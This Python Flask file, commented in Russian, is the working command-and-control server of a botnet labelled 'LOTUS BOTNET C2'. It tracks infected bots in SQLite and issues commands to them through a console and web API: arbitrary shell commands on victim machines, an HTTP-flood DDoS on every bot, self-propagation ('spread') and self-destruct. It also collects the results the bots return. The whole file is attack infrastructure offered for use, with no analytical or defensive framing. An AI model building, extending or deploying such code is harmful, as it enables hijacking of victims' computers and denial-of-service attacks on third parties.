from flask import Flask, request, render_template, jsonify
import sqlite3
import json
import time
from datetime import datetime
import threading
import queue
import os
import sys

app = Flask(__name__)

# ============================================================
# БАЗА ДАННЫХ
# ============================================================

def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS bots (
        id TEXT PRIMARY KEY,
        ip TEXT,
        info TEXT,
        status TEXT DEFAULT 'online',
        last_seen INTEGER,
        registered INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        created INTEGER,
        executed INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        message TEXT,
        timestamp INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

# ============================================================
# КОМАНДНАЯ КОНСОЛЬ (ЧЕРЕЗ CMD) - ТОЛЬКО ДЛЯ ЛОКАЛЬНОГО РЕЖИМА
# ============================================================

command_queue = queue.Queue()

def cmd_console():
    # Проверяем, запущено ли приложение в интерактивном режиме
    if not sys.stdin.isatty() or os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_SERVICE'):
        print("[CONSOLE] Запуск в неинтерактивном режиме (Railway) - консоль отключена")
        return
    
    print("\n" + "="*50)
    print("🐍 LOTUS BOTNET C2 CONSOLE")
    print("="*50)
    print("Команды:")
    print("  help - показать команды")
    print("  list - список ботов")
    print("  cmd <bot_id> <command> - выполнить CMD")
    print("  ddos <url> - запустить DDoS на всех ботах")
    print("  info <bot_id> - получить информацию о боте")
    print("  kill <bot_id> - самоуничтожение бота")
    print("  spread - распространиться")
    print("  logs - показать логи")
    print("  clear - очистить логи")
    print("  exit - выйти")
    print("="*50)

    while True:
        try:
            cmd = input("> ").strip()
            if not cmd:
                continue

            if cmd == "help":
                cmd_console()
            elif cmd == "list":
                show_bots()
            elif cmd.startswith("cmd "):
                parts = cmd.split(" ", 2)
                if len(parts) >= 3:
                    bot_id = parts[1]
                    command = parts[2]
                    send_command(bot_id, "cmd", command)
            elif cmd.startswith("ddos "):
                url = cmd[5:]
                send_command("all", "http_flood", url)
            elif cmd.startswith("info "):
                bot_id = cmd[5:]
                get_bot_info(bot_id)
            elif cmd.startswith("kill "):
                bot_id = cmd[5:]
                send_command(bot_id, "selfdestruct", "")
            elif cmd == "spread":
                send_command("all", "spread", "")
            elif cmd == "logs":
                show_logs()
            elif cmd == "clear":
                clear_logs()
            elif cmd == "exit":
                break
            else:
                print("Неизвестная команда. Введите help")
        except EOFError:
            # На Railway stdin недоступен - просто игнорируем
            time.sleep(60)
            continue
        except Exception as e:
            print(f"Ошибка: {e}")

def show_bots():
    conn = get_db()
    rows = conn.execute('SELECT id, ip, status, last_seen FROM bots ORDER BY last_seen DESC').fetchall()
    conn.close()
    print(f"\n{'ID':<20} {'IP':<15} {'Статус':<10} {'Последний раз'}")
    print("-"*60)
    for row in rows:
        last_seen = datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S') if row['last_seen'] else 'Never'
        print(f"{row['id']:<20} {row['ip']:<15} {row['status']:<10} {last_seen}")
    print()

def send_command(bot_id, command, params):
    conn = get_db()
    conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                 (bot_id, command, params, int(time.time())))
    conn.commit()
    conn.close()
    print(f"✅ Команда отправлена {bot_id}: {command} {params}")

def get_bot_info(bot_id):
    conn = get_db()
    row = conn.execute('SELECT * FROM bots WHERE id = ?', (bot_id,)).fetchone()
    conn.close()
    if row:
        print(f"\nID: {row['id']}")
        print(f"IP: {row['ip']}")
        print(f"Статус: {row['status']}")
        print(f"Информация: {row['info'] or 'Нет'}")
        print(f"Зарегистрирован: {datetime.fromtimestamp(row['registered']).strftime('%Y-%m-%d %H:%M:%S') if row['registered'] else 'Unknown'}")
    else:
        print("Бот не найден")

def show_logs():
    conn = get_db()
    rows = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 50').fetchall()
    conn.close()
    print(f"\n{'Время':<20} {'Бот':<20} {'Сообщение'}")
    print("-"*80)
    for row in rows:
        time_str = datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M:%S') if row['timestamp'] else 'Unknown'
        print(f"{time_str:<20} {row['bot_id']:<20} {row['message'][:50]}")

def clear_logs():
    conn = get_db()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    print("Логи очищены")

# ============================================================
# ЗАПУСК КОНСОЛИ В ОТДЕЛЬНОМ ПОТОКЕ - ТОЛЬКО ЕСЛИ НЕ RAILWAY
# ============================================================

if not os.environ.get('RAILWAY_ENVIRONMENT') and not os.environ.get('RAILWAY_SERVICE'):
    threading.Thread(target=cmd_console, daemon=True).start()
else:
    print("[RAILWAY] Запуск в режиме веб-сервера без интерактивной консоли")

# ============================================================
# API ДЛЯ БОТОВ
# ============================================================

@app.route('/api/register')
def register():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'ERROR'

    ip = request.remote_addr
    now = int(time.time())

    conn = get_db()
    conn.execute('INSERT OR REPLACE INTO bots (id, ip, last_seen, registered, status) VALUES (?, ?, ?, ?, ?)',
                 (bot_id, ip, now, now, 'online'))
    conn.commit()
    conn.close()

    print(f"[REGISTER] {bot_id} from {ip}")
    return 'OK'

@app.route('/api/get')
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'none'

    conn = get_db()
    conn.execute('UPDATE bots SET last_seen = ?, status = "online" WHERE id = ?',
                 (int(time.time()), bot_id))
    conn.commit()

    row = conn.execute('SELECT id, command, params FROM commands WHERE bot_id = ? AND status = "pending" LIMIT 1',
                       (bot_id,)).fetchone()

    if row:
        conn.execute('UPDATE commands SET status = "executing", executed = ? WHERE id = ?',
                     (int(time.time()), row['id']))
        conn.commit()
        conn.close()

        print(f"[EXEC] {bot_id} -> {row['command']}:{row['params']}")
        return f"{row['command']}:{row['params']}"

    conn.close()
    return 'none'

@app.route('/api/result', methods=['POST'])
def save_result():
    bot_id = request.args.get('id')
    result = request.form.get('result', '')

    if not bot_id:
        return 'ERROR'

    conn = get_db()
    row = conn.execute('SELECT id FROM commands WHERE bot_id = ? AND status = "executing" ORDER BY id DESC LIMIT 1',
                       (bot_id,)).fetchone()

    if row:
        conn.execute('UPDATE commands SET status = "done", result = ? WHERE id = ?',
                     (result, row['id']))
        conn.commit()

    conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                 (bot_id, result, int(time.time())))
    conn.commit()
    conn.close()

    print(f"[RESULT] {bot_id} -> {result[:100]}")
    return 'OK'

@app.route('/api/info', methods=['POST'])
def save_info():
    bot_id = request.args.get('id')
    info = request.get_data(as_text=True)

    if not bot_id:
        return 'ERROR'

    conn = get_db()
    conn.execute('UPDATE bots SET info = ? WHERE id = ?', (info, bot_id))
    conn.commit()
    conn.close()

    print(f"[INFO] {bot_id} updated")
    return 'OK'

# ============================================================
# АДМИН-ПАНЕЛЬ
# ============================================================

@app.route('/')
def admin():
    return render_template('index.html')

@app.route('/api/stats')
def api_stats():
    conn = get_db()
    total = conn.execute('SELECT COUNT(*) FROM bots').fetchone()[0]
    online = conn.execute('SELECT COUNT(*) FROM bots WHERE status = "online" AND last_seen > ?',
                          (int(time.time()) - 600,)).fetchone()[0]
    offline = total - online
    commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
    logs = conn.execute('SELECT COUNT(*) FROM logs').fetchone()[0]
    conn.close()
    return jsonify({
        'total': total,
        'online': online,
        'offline': offline,
        'commands': commands,
        'logs': logs
    })

@app.route('/api/bots')
def api_bots():
    conn = get_db()
    rows = conn.execute('SELECT * FROM bots ORDER BY last_seen DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/logs')
def api_logs():
    limit = request.args.get('limit', 100, type=int)
    conn = get_db()
    rows = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    conn = get_db()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/delete_bot', methods=['POST'])
def api_delete_bot():
    bot_id = request.form.get('id')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE id = ?', (bot_id,))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    bot_id = request.form.get('bot_id')
    command = request.form.get('command')
    params = request.form.get('params', '')

    if not command:
        return 'ERROR'

    conn = get_db()

    if bot_id == 'all':
        rows = conn.execute('SELECT id FROM bots WHERE status = "online"').fetchall()
        for row in rows:
            conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                         (row['id'], command, params, int(time.time())))
    else:
        conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                     (bot_id, command, params, int(time.time())))

    conn.commit()
    conn.close()

    print(f"[CMD] {bot_id} -> {command} {params}")
    return 'OK'

@app.route('/api/cmd_console', methods=['POST'])
def api_cmd_console():
    cmd = request.form.get('cmd')
    if cmd:
        parts = cmd.split()
        if parts:
            if parts[0] == 'ddos' and len(parts) > 1:
                send_command('all', 'http_flood', parts[1])
            elif parts[0] == 'cmd' and len(parts) > 2:
                send_command(parts[1], 'cmd', ' '.join(parts[2:]))
            elif parts[0] == 'list':
                show_bots()
    return 'OK'

@app.route('/health')
def health():
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
